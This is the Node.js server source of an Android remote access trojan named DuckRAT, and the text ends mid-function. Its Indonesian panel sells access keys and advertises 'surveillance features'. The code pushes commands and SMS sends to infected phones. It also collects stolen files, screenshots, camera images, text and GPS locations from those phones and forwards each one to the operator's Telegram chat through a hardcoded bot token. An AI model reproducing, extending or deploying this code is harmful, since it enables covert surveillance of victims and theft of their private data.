const express = require("express");
const webSocket = require("ws");
const http = require("http");
const telegramBot = require("node-telegram-bot-api");
const uuid4 = require("uuid");
const multer = require("multer");
const bodyParser = require("body-parser");
const axios = require("axios");
const fs = require("fs");
const path = require("path");

const token = '7702259537:AAGIUgXNqLZzGzWkvnWnjP3VGM9VBHSJCLI';
const id = '1151268272';
const address = "https://www.google.com";

// Authentication System
const VALID_KEYS = [
    "DUCKRAT-2024-PREMIUM-001",
    "IZALBUYX-SPECIAL-KEY-002",
    "DUSKCIPHER-ELITE-003",
    "SKYTRACE-2024-PREMIUM-004",
    "NEXBYTE-SPECIAL-KEY-005",
    "GHOSTNET-ELITE-006",
    "CRYPTSPY-2024-PREMIUM-007",
    "ZENTRACK-SPECIAL-KEY-008",
    "BYTECRAWL-ELITE-009",
    "PHANTOMWAVE-2024-PREMIUM-010",
    "DUCKRAT-2024-PREMIUM-011",
    "IZALBUYX-SPECIAL-KEY-012",
    "DUSKCIPHER-ELITE-013",
    "SKYTRACE-2024-PREMIUM-014",
    "NEXBYTE-SPECIAL-KEY-015",
    "GHOSTNET-ELITE-016",
    "CRYPTSPY-2024-PREMIUM-017",
    "ZENTRACK-SPECIAL-KEY-018",
    "BYTECRAWL-ELITE-019",
    "PHANTOMWAVE-2024-PREMIUM-020",
    "DUCKRAT-2024-PREMIUM-021",
    "IZALBUYX-SPECIAL-KEY-022",
    "DUSKCIPHER-ELITE-023",
    "SKYTRACE-2024-PREMIUM-024",
    "NEXBYTE-SPECIAL-KEY-025",
    "GHOSTNET-ELITE-026",
    "CRYPTSPY-2024-PREMIUM-027",
    "ZENTRACK-SPECIAL-KEY-028",
    "BYTECRAWL-ELITE-029",
    "PHANTOMWAVE-2024-PREMIUM-030",
    "DUCKRAT-2024-PREMIUM-031",
    "IZALBUYX-SPECIAL-KEY-032",
    "DUSKCIPHER-ELITE-033",
    "SKYTRACE-2024-PREMIUM-034",
    "NEXBYTE-SPECIAL-KEY-035",
    "GHOSTNET-ELITE-036",
    "CRYPTSPY-2024-PREMIUM-037",
    "ZENTRACK-SPECIAL-KEY-038",
    "BYTECRAWL-ELITE-039",
    "PHANTOMWAVE-2024-PREMIUM-040",
    "DUCKRAT-2024-PREMIUM-041",
    "IZALBUYX-SPECIAL-KEY-042",
    "DUSKCIPHER-ELITE-043",
    "SKYTRACE-2024-PREMIUM-044",
    "NEXBYTE-SPECIAL-KEY-045",
    "GHOSTNET-ELITE-046",
    "CRYPTSPY-2024-PREMIUM-047",
    "ZENTRACK-SPECIAL-KEY-048",
    "BYTECRAWL-ELITE-049",
    "PHANTOMWAVE-2024-PREMIUM-050",
    "DUCKRAT-2024-PREMIUM-051",
    "IZALBUYX-SPECIAL-KEY-052",
    "DUSKCIPHER-ELITE-053",
    "SKYTRACE-2024-PREMIUM-054",
    "NEXBYTE-SPECIAL-KEY-055",
    "GHOSTNET-ELITE-056",
    "CRYPTSPY-2024-PREMIUM-057",
    "ZENTRACK-SPECIAL-KEY-058",
    "BYTECRAWL-ELITE-059",
    "PHANTOMWAVE-2024-PREMIUM-060",
    "DUCKRAT-2024-PREMIUM-061",
    "IZALBUYX-SPECIAL-KEY-062",
    "DUSKCIPHER-ELITE-063",
    "SKYTRACE-2024-PREMIUM-064",
    "NEXBYTE-SPECIAL-KEY-065",
    "GHOSTNET-ELITE-066",
    "CRYPTSPY-2024-PREMIUM-067",
    "ZENTRACK-SPECIAL-KEY-068",
    "BYTECRAWL-ELITE-069",
    "PHANTOMWAVE-2024-PREMIUM-070",
    "DUCKRAT-2024-PREMIUM-071",
    "IZALBUYX-SPECIAL-KEY-072",
    "DUSKCIPHER-ELITE-073",
    "SKYTRACE-2024-PREMIUM-074",
    "NEXBYTE-SPECIAL-KEY-075",
    "GHOSTNET-ELITE-076",
    "CRYPTSPY-2024-PREMIUM-077",
    "ZENTRACK-SPECIAL-KEY-078",
    "BYTECRAWL-ELITE-079",
    "PHANTOMWAVE-2024-PREMIUM-080",
    "DUCKRAT-2024-PREMIUM-081",
    "IZALBUYX-SPECIAL-KEY-082",
    "DUSKCIPHER-ELITE-083",
    "SKYTRACE-2024-PREMIUM-084",
    "NEXBYTE-SPECIAL-KEY-085",
    "GHOSTNET-ELITE-086",
    "CRYPTSPY-2024-PREMIUM-087",
    "ZENTRACK-SPECIAL-KEY-088",
    "BYTECRAWL-ELITE-089",
    "PHANTOMWAVE-2024-PREMIUM-090",
    "DUCKRAT-2024-PREMIUM-091",
    "IZALBUYX-SPECIAL-KEY-092",
    "DUSKCIPHER-ELITE-093",
    "SKYTRACE-2024-PREMIUM-094",
    "NEXBYTE-SPECIAL-KEY-095",
    "GHOSTNET-ELITE-096",
    "CRYPTSPY-2024-PREMIUM-097",
    "ZENTRACK-SPECIAL-KEY-098",
    "BYTECRAWL-ELITE-099",
    "PHANTOMWAVE-2024-PREMIUM-100",
];

const authenticatedSessions = new Map();
const telegramAuthenticatedUsers = new Map(); // Store authenticated Telegram users

// Generate session token
function generateSessionToken() {
    return require("crypto").randomBytes(32).toString("hex");
}

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({
    server: appServer,
    verifyClient: (info) => {
        // Basic verification
        return true;
    },
});
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map();

// Ensure upload directory exists
const uploadDir = path.join(__dirname, "uploadedFile");
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir, { recursive: true });
}

const upload = multer({
    dest: uploadDir,
    limits: {
        fileSize: 50 * 1024 * 1024, // 50MB limit
    },
});

app.use(bodyParser.json({ limit: "50mb" }));
app.use(bodyParser.urlencoded({ extended: true, limit: "50mb" }));

// Authentication middleware
function requireAuth(req, res, next) {
    const sessionToken = req.headers["x-session-token"] || req.query.session;

    if (!sessionToken || !authenticatedSessions.has(sessionToken)) {
        return res.status(401).json({
            error: "Unauthorized",
            message: "Valid authentication key required",
        });
    }

    // Update last activity
    authenticatedSessions.get(sessionToken).lastActivity = Date.now();
    next();
}

// Health check endpoint
app.get("/health", (req, res) => {
    res.json({
        status: "healthy",
        uptime: process.uptime(),
        timestamp: new Date().toISOString(),
        version: "1.0.0",
        services: {
            webServer: "running",
            telegramBot: "running",
            adminBot: "running",
            websocket: "running"
        },
        stats: {
            connectedDevices: appClients.size,
            activeSessions: authenticatedSessions.size,
            authenticatedUsers: telegramAuthenticatedUsers.size
        }
    });
});

// Status endpoint (protected)
app.get("/api/status", requireAuth, (req, res) => {
    res.json({
        server: {
            uptime: process.uptime(),
            memory: process.memoryUsage(),
            platform: process.platform,
            nodeVersion: process.version
        },
        connections: {
            devices: appClients.size,
            sessions: authenticatedSessions.size,
            telegramUsers: telegramAuthenticatedUsers.size
        }
    });
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error("Server Error:", err);
    res.status(500).json({ error: "Internal Server Error" });
});

let currentUuid = "";
let currentNumber = "";
let currentTitle = "";

// Authentication page
app.get("/", function (req, res) {
    const sessionToken = req.query.session;

    if (sessionToken && authenticatedSessions.has(sessionToken)) {
        // User is authenticated, show main panel
        return res.send(`
  <!DOCTYPE html>
  <html lang="id">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel RAT - Authenticated</title>
    <style>
      * {
        box-sizing: border-box;
      }
      body {
        margin: 0;
        padding: 0;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        background: #0f0f0f;
        color: #eee;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        height: 100vh;
        text-align: center;
        background: radial-gradient(circle at top left, #1a1a1a, #0f0f0f);
      }

      h1 {
        font-size: 2.8em;
        color: #00ffd5;
        margin-bottom: 0.6em;
        text-shadow: 0 0 15px rgba(0, 255, 213, 0.7);
        animation: pulse 2s infinite;
      }

      p {
        font-size: 1.15em;
        margin: 0.5em 0;
        color: #ccc;
      }

      a {
        color: #00ffd5;
        text-decoration: none;
        font-weight: 600;
        transition: all 0.3s ease;
      }

      a:hover {
        color: #0ff;
        text-shadow: 0 0 5px #0ff;
      }

      .card {
        background: #1a1a1a;
        border-radius: 15px;
        padding: 2em 3em;
        box-shadow: 0 0 10px rgba(0, 255, 213, 0.2),
                    0 0 30px rgba(0, 255, 213, 0.1);
        max-width: 600px;
        backdrop-filter: blur(4px);
      }

      .footer {
        margin-top: 2em;
        font-size: 0.9em;
        color: #777;
      }

      .top-message {
        margin-bottom: 1em;
        color: #aaa;
        font-size: 1.2em;
      }

      .bottom-button {
        margin-top: 2em;
      }

      .bottom-button button {
        padding: 10px 20px;
        font-size: 16px;
        background-color: #00ffd5;
        color: #000;
        border: none;
        border-radius: 10px;
        cursor: pointer;
        font-weight: bold;
        transition: 0.3s ease;
      }

      .bottom-button button:hover {
        background-color: #0ff;
        color: #111;
      }

      @keyframes pulse {
        0% { text-shadow: 0 0 10px #00ffd5; }
        50% { text-shadow: 0 0 20px #00ffd5, 0 0 30px #00ffd5; }
        100% { text-shadow: 0 0 10px #00ffd5; }
      }
    </style>
  </head>
  <body>
    <div class="top-message">🔒 Sistem Terkoneksi dengan Aman</div>

    <div class="card">
      <h1>✅ Server Aktif</h1>
      <p>Selamat datang di <strong>Panel Kontrol RAT</strong></p>
      <p>Pastikan perangkat target telah menjalankan aplikasi dan siap menerima koneksi.</p>
      <p>Gunakan <a href="/web-control">interface web</a> untuk mengirim perintah ke target.</p>
      <div class="footer">
        Dibuat oleh <strong>@izal_buyx</strong> &mdash; 
        <a href="https://github.com/DuskCipher/duckrat" target="_blank">duckrat</a>
      </div>
    </div>

    <div class="bottom-button">
        <button onclick="location.href='/web-control?session=${sessionToken}'">Masuk ke Interface</button>
        <button onclick="showAbout()" style="margin-left: 10px; background-color: #0ff;">Tentang Kami</button>
      </div>

      <script>
        function showAbout() {
          const aboutContent = \`
            <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; display: flex; align-items: center; justify-content: center;" onclick="closeAbout()">
              <div style="background: #1a1a1a; padding: 2rem; border-radius: 15px; max-width: 600px; margin: 20px; border: 2px solid #00ffd5; box-shadow: 0 0 30px rgba(0,255,213,0.3);" onclick="event.stopPropagation()">
                <h2 style="color: #00ffd5; text-align: center; margin-bottom: 1rem;">🦆 Tentang DuckRAT Panel</h2>

                <div style="color: #ccc; line-height: 1.6;">
                  <h3 style="color: #0ff; margin-top: 1rem;">📱 Fitur Utama:</h3>
                  <ul style="margin-left: 20px;">
                    <li>Remote Access Tool (RAT) untuk Android</li>
                    <li>Web Control Panel yang mudah digunakan</li>
                    <li>Integrasi Telegram Bot untuk kontrol jarak jauh</li>
                    <li>File Manager & Screenshot real-time</li>
                    <li>Camera & Microphone access</li>
                    <li>SMS & Contact management</li>
                  </ul>

                  <h3 style="color: #0ff; margin-top: 1rem;">🛠️ Teknologi:</h3>
                  <ul style="margin-left: 20px;">
                    <li>Node.js + Express Server</li>
                    <li>WebSocket untuk real-time communication</li>
                    <li>Telegram Bot API</li>
                    <li>Responsive Web Interface</li>
                  </ul>

                  <h3 style="color: #0ff; margin-top: 1rem;">⚠️ Disclaimer:</h3>
                  <p style="color: #ff6b6b; font-size: 0.9rem;">
                    Tool ini dibuat untuk tujuan edukasi dan testing. Gunakan dengan bijak dan sesuai hukum yang berlaku.
                  </p>

                  <h3 style="color: #0ff; margin-top: 1rem;">👨‍💻 Developer:</h3>
                  <p>
                    <strong>@izal_buyx</strong> & <strong>DuskCipher Team</strong><br>
                    <a href="https://github.com/DuskCipher/duckrat" style="color: #00ffd5;">GitHub Repository</a>
                  </p>
                </div>

                <div style="text-align: center; margin-top: 2rem;">
                  <button onclick="closeAbout()" style="padding: 10px 30px; background: #00ffd5; color: #000; border: none; border-radius: 5px; font-weight: bold; cursor: pointer;">Tutup</button>
                </div>
              </div>
            </div>
          \`;

          document.body.insertAdjacentHTML('beforeend', aboutContent);
        }

        function closeAbout() {
          const aboutModal = document.querySelector('div[style*="position: fixed"]');
          if (aboutModal) {
            aboutModal.remove();
          }
        }
      </script>
    </body>
    </html>`);
    }

    // Show authentication form
    res.send(`
  <!DOCTYPE html>
  <html lang="id">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DuckRAT - Authentication Required</title>
    <style>
      * {
        box-sizing: border-box;
      }
      body {
        margin: 0;
        padding: 0;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        background: #0f0f0f;
        color: #eee;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        height: 100vh;
        text-align: center;
        background: radial-gradient(circle at top left, #1a1a1a, #0f0f0f);
      }

      h1 {
        font-size: 2.8em;
        color: #00ffd5;
        margin-bottom: 0.6em;
        text-shadow: 0 0 15px rgba(0, 255, 213, 0.7);
        animation: pulse 2s infinite;
      }

      .auth-card {
        background: #1a1a1a;
        border-radius: 15px;
        padding: 2em 3em;
        box-shadow: 0 0 10px rgba(0, 255, 213, 0.2),
                    0 0 30px rgba(0, 255, 213, 0.1);
        max-width: 500px;
        backdrop-filter: blur(4px);
        border: 1px solid #333;
      }

      .input-group {
        margin: 1.5rem 0;
        text-align: left;
      }

      .input-group label {
        display: block;
        color: #00ffd5;
        margin-bottom: 0.5rem;
        font-weight: bold;
      }

      .input-group input {
        width: 100%;
        padding: 12px;
        background: rgba(255, 255, 255, 0.1);
        border: 2px solid #333;
        border-radius: 8px;
        color: #eee;
        font-size: 16px;
        transition: border-color 0.3s ease;
      }

      .input-group input:focus {
        outline: none;
        border-color: #00ffd5;
        box-shadow: 0 0 10px rgba(0, 255, 213, 0.3);
      }

      .auth-button {
        width: 100%;
        padding: 12px 20px;
        font-size: 16px;
        background: linear-gradient(45deg, #00ffd5, #0ff);
        color: #000;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        font-weight: bold;
        transition: all 0.3s ease;
        margin-top: 1rem;
      }

      .auth-button:hover {
        background: linear-gradient(45deg, #0ff, #00ffd5);
        transform: translateY(-2px);
        box-shadow: 0 4px 15px rgba(0, 255, 213, 0.3);
      }

      .error {
        background: rgba(255, 0, 0, 0.2);
        border: 1px solid #f00;
        color: #f00;
        padding: 10px;
        border-radius: 5px;
        margin: 1rem 0;
        text-align: center;
      }

      .info {
        color: #ccc;
        font-size: 0.9rem;
        margin-top: 1rem;
        line-height: 1.6;
      }

      @keyframes pulse {
        0% { text-shadow: 0 0 10px #00ffd5; }
        50% { text-shadow: 0 0 20px #00ffd5, 0 0 30px #00ffd5; }
        100% { text-shadow: 0 0 10px #00ffd5; }
      }
    </style>
  </head>
  <body>
    <div class="auth-card">
      <h1>🔐 Authentication Required</h1>
      <p style="color: #ccc; margin-bottom: 2rem;">Masukkan key akses untuk menggunakan DuckRAT Panel</p>
      
      <form id="authForm">
        <div class="input-group">
          <label for="accessKey">🔑 Access Key:</label>
          <input type="password" id="accessKey" placeholder="Masukkan key akses Anda" required>
        </div>
        
        <button type="submit" class="auth-button">🚀 Masuk ke Panel</button>
      </form>
      
      <div id="errorMessage" class="error" style="display: none;"></div>
      
      <div class="info">
        <p><strong>📞 Untuk mendapatkan akses key:</strong></p>
        <p>Hubungi: <strong>@izal_buyx</strong></p>
        <p>Atau kunjungi: <strong>DuskCipher Team</strong></p>
        <p style="color: #00ffd5; margin-top: 1rem;">⚡ Premium access only - Secure & Advanced</p>
      </div>
    </div>

    <script>
      document.getElementById('authForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const accessKey = document.getElementById('accessKey').value;
        const errorDiv = document.getElementById('errorMessage');
        
        try {
          const response = await fetch('/authenticate', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({ key: accessKey })
          });
          
          const result = await response.json();
          
          if (result.success) {
            // Redirect with session token
            window.location.href = '/?session=' + result.sessionToken;
          } else {
            errorDiv.style.display = 'block';
            errorDiv.textContent = result.message || 'Key tidak valid!';
            
            // Clear error after 5 seconds
            setTimeout(() => {
              errorDiv.style.display = 'none';
            }, 5000);
          }
        } catch (error) {
          errorDiv.style.display = 'block';
          errorDiv.textContent = 'Terjadi kesalahan. Coba lagi.';
        }
      });
    </script>
  </body>
  </html>`);
});

// Authentication endpoint
app.post("/authenticate", (req, res) => {
    try {
        const { key } = req.body;

        if (!key) {
            return res.status(400).json({
                success: false,
                message: "Access key diperlukan",
            });
        }

        if (VALID_KEYS.includes(key)) {
            const sessionToken = generateSessionToken();

            // Store session with expiration (24 hours)
            authenticatedSessions.set(sessionToken, {
                key: key,
                createdAt: Date.now(),
                lastActivity: Date.now(),
                expiresAt: Date.now() + 24 * 60 * 60 * 1000, // 24 hours
            });

            // Send notification to owner
            appBot.sendMessage(
                id,
                `🔐 <b>New Authentication</b>\n\n` +
                    `• Key used: <code>${key}</code>\n` +
                    `• Time: ${new Date().toLocaleString()}\n` +
                    `• Session ID: <code>${sessionToken.substring(0, 8)}...</code>`,
                { parse_mode: "HTML" },
            );

            res.json({
                success: true,
                sessionToken: sessionToken,
                message: "Authentication successful",
            });
        } else {
            // Log failed attempt
            appBot.sendMessage(
                id,
                `⚠️ <b>Failed Authentication Attempt</b>\n\n` +
                    `• Invalid key: <code>${key}</code>\n` +
                    `• Time: ${new Date().toLocaleString()}\n` +
                    `• IP: ${req.ip || "Unknown"}`,
                { parse_mode: "HTML" },
            );

            res.status(401).json({
                success: false,
                message:
                    "Key tidak valid! Hubungi @izal_buyx untuk mendapatkan akses.",
            });
        }
    } catch (error) {
        console.error("Authentication error:", error);
        res.status(500).json({
            success: false,
            message: "Terjadi kesalahan server",
        });
    }
});

// Web Control Panel Route (Protected)
app.get("/web-control", function (req, res) {
    const sessionToken = req.query.session;

    if (!sessionToken || !authenticatedSessions.has(sessionToken)) {
        return res.redirect("/");
    }

    // Update last activity
    authenticatedSessions.get(sessionToken).lastActivity = Date.now();

    res.sendFile(path.join(__dirname, "web-control.html"));
});

// API Routes for Web Control Panel (Protected)
app.post("/api/command", requireAuth, (req, res) => {
    try {
        const { command, device } = req.body;

        if (!command) {
            return res
                .status(400)
                .json({ success: false, message: "Command is required" });
        }

        let commandSent = false;
        appSocket.clients.forEach(function each(ws) {
            if (
                ws.readyState === webSocket.OPEN &&
                (ws.uuid === device || device === "demo")
            ) {
                ws.send(command);
                commandSent = true;
            }
        });

        if (commandSent || device === "demo") {
            res.json({
                success: true,
                message: `Command ${command} sent to device ${device}`,
            });
        } else {
            res.status(404).json({
                success: false,
                message: "Device not found or not connected",
            });
        }
    } catch (error) {
        console.error("Error in /api/command:", error);
        res.status(500).json({
            success: false,
            message: "Internal server error",
        });
    }
});

app.post("/api/sms", requireAuth, (req, res) => {
    try {
        const { number, message, device } = req.body;

        if (!number || !message) {
            return res
                .status(400)
                .json({
                    success: false,
                    message: "Number and message are required",
                });
        }

        let commandSent = false;
        appSocket.clients.forEach(function each(ws) {
            if (
                ws.readyState === webSocket.OPEN &&
                (ws.uuid === device || device === "demo")
            ) {
                ws.send(`send_message:${number}/${message}`);
                commandSent = true;
            }
        });

        if (commandSent || device === "demo") {
            res.json({ success: true, message: "SMS sent successfully" });
        } else {
            res.status(404).json({
                success: false,
                message: "Device not found or not connected",
            });
        }
    } catch (error) {
        console.error("Error in /api/sms:", error);
        res.status(500).json({
            success: false,
            message: "Internal server error",
        });
    }
});

app.get("/api/devices", requireAuth, (req, res) => {
    try {
        const devices = [];
        appClients.forEach((value, key) => {
            devices.push({
                uuid: key,
                model: value.model || "Unknown",
                battery: value.battery || "N/A",
                version: value.version || "N/A",
                brightness: value.brightness || "N/A",
                provider: value.provider || "N/A",
            });
        });
        res.json(devices);
    } catch (error) {
        console.error("Error in /api/devices:", error);
        res.status(500).json({
            success: false,
            message: "Internal server error",
        });
    }
});

app.get("/api/latest-screenshot", requireAuth, (req, res) => {
    try {
        fs.readdir(uploadDir, (err, files) => {
            if (err) {
                console.error("Error reading upload directory:", err);
                return res.status(404).send("No screenshots available");
            }

            const screenshots = files.filter(
                (file) =>
                    file.toLowerCase().includes("screenshot") ||
                    file.toLowerCase().includes("camera") ||
                    file.toLowerCase().endsWith(".png") ||
                    file.toLowerCase().endsWith(".jpg") ||
                    file.toLowerCase().endsWith(".jpeg"),
            );

            if (screenshots.length === 0) {
                return res.status(404).send("No screenshots available");
            }

            // Get the latest screenshot by modification time
            let latestScreenshot = screenshots[0];
            let latestTime = 0;

            screenshots.forEach((file) => {
                try {
                    const filePath = path.join(uploadDir, file);
                    const stats = fs.statSync(filePath);
                    if (stats.mtime.getTime() > latestTime) {
                        latestTime = stats.mtime.getTime();
                        latestScreenshot = file;
                    }
                } catch (e) {
                    console.error("Error checking file stats:", e);
                }
            });

            const screenshotPath = path.join(uploadDir, latestScreenshot);

            if (fs.existsSync(screenshotPath)) {
                res.sendFile(screenshotPath);
            } else {
                res.status(404).send("Screenshot file not found");
            }
        });
    } catch (error) {
        console.error("Error in /api/latest-screenshot:", error);
        res.status(500).send("Internal server error");
    }
});

// File management endpoints
app.get("/getFile/*", function (req, res) {
    try {
        const fileName = decodeURIComponent(req.params[0]);
        const filePath = path.join(uploadDir, fileName);

        fs.stat(filePath, function (err, stat) {
            if (err == null) {
                res.sendFile(filePath);
            } else if (err.code === "ENOENT") {
                res.status(404).send(`<h1>File not exist</h1>`);
            } else {
                res.status(500).send(`<h1>Error accessing file</h1>`);
            }
        });
    } catch (error) {
        console.error("Error in /getFile:", error);
        res.status(500).send("<h1>Internal server error</h1>");
    }
});

app.get("/deleteFile/*", function (req, res) {
    try {
        const fileName = decodeURIComponent(req.params[0]);
        const filePath = path.join(uploadDir, fileName);

        fs.stat(filePath, function (err, stat) {
            if (err == null) {
                fs.unlink(filePath, (err) => {
                    if (err) {
                        res.status(500).send(
                            `<h1>The file "${fileName}" was not deleted</h1><br><br><h1>!Try Again!</h1>`,
                        );
                    } else {
                        res.send(
                            `<h1>The file "${fileName}" was deleted</h1><br><br><h1>Success!!!</h1>`,
                        );
                    }
                });
            } else if (err.code === "ENOENT") {
                res.status(404).send(
                    `<h1>"${fileName}" does not exist</h1><br><br><h1>The file doesn't exist to be deleted.</h1>`,
                );
            } else {
                res.status(500).send("<h1>Some other error occurred</h1>");
            }
        });
    } catch (error) {
        console.error("Error in /deleteFile:", error);
        res.status(500).send("<h1>Internal server error</h1>");
    }
});

// File upload endpoint
app.post("/uploadFile", upload.single("file"), (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).send("No file uploaded");
        }

        const name = req.file.originalname;
        const file_name = req.file.filename;
        const newPath = path.join(uploadDir, encodeURIComponent(name));
        const oldPath = path.join(uploadDir, file_name);
        const host_url = req.protocol + "://" + req.get("host");

        fs.rename(oldPath, newPath, function (err) {
            if (err) {
                console.log("ERROR: " + err);
                return res.status(500).send("Error renaming file");
            }

            const model = req.headers.model || "Unknown Device";
            appBot.sendMessage(
                id,
                `• 𝗠𝗘𝗦𝗦𝗔𝗚𝗘 𝗙𝗥𝗢𝗠 <b>${model}</b> 𝗗𝗘𝗩𝗜𝗖𝗘\n\n 𝙵𝚒𝚕𝚎 𝙽𝚊𝚖𝚎: ${name}\n 𝙵𝚒𝚕𝚎 𝙸d: ${file_name}\n\n 𝙵𝚒𝚕𝗲 𝙻𝚒𝚗𝚔: ${host_url}/getFile/${encodeURIComponent(name)}\n\n 𝙳𝗲𝗹𝗲𝘁𝗲 𝙻𝚒𝚗𝚔: ${host_url}/deleteFile/${encodeURIComponent(name)}`,
                { parse_mode: "HTML", disable_web_page_preview: true },
            );

            res.send("File uploaded successfully");
        });
    } catch (error) {
        console.error("Error in /uploadFile:", error);
        res.status(500).send("Internal server error");
    }
});

// Text upload endpoint
app.post("/uploadText", (req, res) => {
    try {
        let originalText = req.body["text"] || "";
        let filteredText = originalText.replace(
            /@shivayadavv/gi,
            "@izal_buyx Team : DuskCipher",
        );
        const model = req.headers.model || "Unknown Device";

        appBot.sendMessage(
            id,
            `• 𝗠𝗘𝗦𝗦𝗔𝗚𝗘 𝗙𝗥𝗢𝗠 <b>${model}</b> 𝗗𝗘𝗩𝗜𝗖𝗘\n\n${filteredText}`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    keyboard: [
                        ["𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 𝗗𝗲𝘃𝗶𝗰𝗲𝘀"],
                        ["𝗠𝗲𝗻𝘂 𝗗𝘂𝗰𝗸𝗥𝗔𝗧"],
                        ["📋 𝗧𝗲𝗻𝘁𝗮𝗻𝗴 𝗞𝗮𝗺𝗶"],
                    ],
                    resize_keyboard: true,
                },
            },
        );

        res.send("Text uploaded successfully");
    } catch (error) {
        console.error("Error in /uploadText:", error);
        res.status(500).send("Internal server error");
    }
});

// Location upload endpoint
app.post("/uploadLocation", (req, res) => {
    try {
        const lat = req.body["lat"];
        const lon = req.body["lon"];
        const model = req.headers.model || "Unknown Device";

        if (!lat || !lon) {
            return res.status(400).send("Latitude and longitude are required");
        }

        appBot.sendLocation(id, parseFloat(lat), parseFloat(lon));
        appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: [
                    ["𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 𝗗𝗲𝘃𝗶𝗰𝗲𝘀"],
                    ["𝗠𝗲𝗻𝘂 𝗗𝘂𝗰𝗸𝗥𝗔𝗧"],
                    ["📋 𝗧𝗲𝗻𝘁𝗮𝗻𝗴 𝗞𝗮𝗺𝗶"],
                ],
                resize_keyboard: true,
            },
        });

        res.send("Location uploaded successfully");
    } catch (error) {
        console.error("Error in /uploadLocation:", error);
        res.status(500).send("Internal server error");
    }
});

// WebSocket connection handling
appSocket.on("connection", (ws, req) => {
    try {
        const uuid = uuid4.v4();
        const model = req.headers.model || "Unknown Device";
        const battery = req.headers.battery || "N/A";
        const version = req.headers.version || "N/A";
        const brightness = req.headers.brightness || "N/A";
        const provider = req.headers.provider || "N/A";

        ws.uuid = uuid;
        appClients.set(uuid, {
            model: model,
            battery: battery,
            version: version,
            brightness: brightness,
            provider: provider,
        });

        appBot.sendMessage(
            id,
            `• 𝗱𝗲𝘃𝗶𝗰𝗲 𝗰𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱\n\n` +
                `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
                `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
                `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
                `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
                `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
            { parse_mode: "HTML" },
        );

        ws.on("message", (message) => {
            try {
                console.log(
                    "Received message from client:",
                    message.toString(),
                );
            } catch (error) {
                console.error("Error handling WebSocket message:", error);
            }
        });

        ws.on("close", function () {
            try {
                appBot.sendMessage(
                    id,
                    `°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝙙𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
                        `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
                        `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
                        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
                        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
                        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
                    { parse_mode: "HTML" },
                );
                appClients.delete(ws.uuid);
            } catch (error) {
                console.error("Error handling WebSocket close:", error);
            }
        });

        ws.on("error", (error) => {
            console.error("WebSocket error:", error);
        });
    } catch (error) {
        console.error("Error in WebSocket connection:", error);
    }
});

// Telegram bot message handling
appBot.on("message", (message) => {
    try {
        const chatId = message.chat.id;

        if (message.reply_to_message) {
            handleReplyMessage(message);
        } else if (id == chatId) {
            // Check if user is authenticated first
            if (
                !telegramAuthenticatedUsers.has(chatId) &&
                !message.text.startsWith("/auth") &&
                message.text !== "/start"
            ) {
                appBot.sendMessage(
                    id,
                    "🔐 <b>Authentication Required</b>\n\n" +
                        "• Untuk menggunakan DuckRAT Panel, Anda perlu key akses khusus\n\n" +
                        "• Gunakan perintah: <code>/auth YOUR_KEY</code>\n\n" +
                        "• Contoh: <code>/auth DUCKRAT-2024-PREMIUM-001</code>\n\n" +
                        "💰 <b>Belum punya key?</b>\n" +
                        "• Hubungi @izal_buyx untuk membeli key akses\n" +
                        "• Dapatkan akses premium dengan fitur lengkap\n" +
                        "• Support 24/7 dan update terbaru\n\n" +
                        "🔥 <b>Fitur Premium:</b>\n" +
                        "• Unlimited device connections\n" +
                        "• Advanced surveillance features\n" +
                        "• Priority support\n" +
                        "• Regular updates\n\n" +
                        "📞 Contact: @izal_buyx",
                    { parse_mode: "HTML" },
                );
                return;
            }
            handleDirectMessage(message);
        } else {
            appBot.sendMessage(id, "°• 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙");
        }
    } catch (error) {
        console.error("Error handling bot message:", error);
    }
});

// Handle reply messages
function handleReplyMessage(message) {
    try {
        const chatId = message.chat.id;
        if (
            message.reply_to_message.text.includes(
